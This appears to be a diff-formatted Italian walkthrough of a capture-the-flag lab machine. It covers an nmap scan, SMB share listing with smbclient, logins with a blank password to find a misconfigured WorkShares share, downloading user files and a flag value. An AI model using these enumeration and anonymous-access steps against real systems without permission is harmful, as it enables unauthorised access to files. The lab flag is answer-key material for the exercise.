@@ -1,0 +1,73 @@
+IP: 10.129.187.170
+-----------
+controllo porte e servizi aperti 
+
+sudo nmap 10.129.187.170 -sV                     
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-03 03:45 EDT
+Nmap scan report for 10.129.187.170
+Host is up (0.083s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+vedo sulla porta 445 il servizio che mi interessa SMB
+-----------
+tramite il servizio smbclinet provo ad accedere, come userbame usa se non specificato quello della mia macchiana e lascio il campo password vuoto
+
+smbclient -L 10.129.187.170
+Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        WorkShares      Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.187.170 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+mi restituisce una serie di cartelle presenti sulla macchina, provo a connetermi sempre con il campo password vuoto per cercare una configurazione sbagliata tranna nella cartella IPC la quale non contiene  info utitli
+-----------
+smbclient \\\\10.129.187.170\\ADMIN$
+tree connect failed: NT_STATUS_ACCESS_DENIED
+
+smbclient \\\\10.129.187.170\\C$
+tree connect failed: NT_STATUS_ACCESS_DENIED
+
+le prime due falliscono in qanto richiedono una password, WorkShare invece da un esito positivo
+
+smbclient \\\\10.129.187.170\\WorkShares
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> 
+------------------
+ora cone help cerco i comandi e navigo nella cartella
+
+smb: \> dir
+  .                                   D        0  Mon Mar 29 04:22:01 2021
+  ..                                  D        0  Mon Mar 29 04:22:01 2021
+  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
+  James.P                             D        0  Thu Jun  3 04:38:03 2021
+
+apro la directory e scarico il file di Amy.J
+
+smb: \> cd Amy.J\
+smb: \Amy.J\> dir
+  .                                   D        0  Mon Mar 29 05:08:24 2021
+  ..                                  D        0  Mon Mar 29 05:08:24 2021
+  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021
+
+                5114111 blocks of size 4096. 1748763 blocks available
+smb: \Amy.J\> get worknotes.txt 
+getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+
+ripeto la stessa cosa per James.P, nella sua cartella vedo il file flag, lo scarico e lo apro
+5f61c10dffbc77a704d76016a22f1664
+
+
+
+
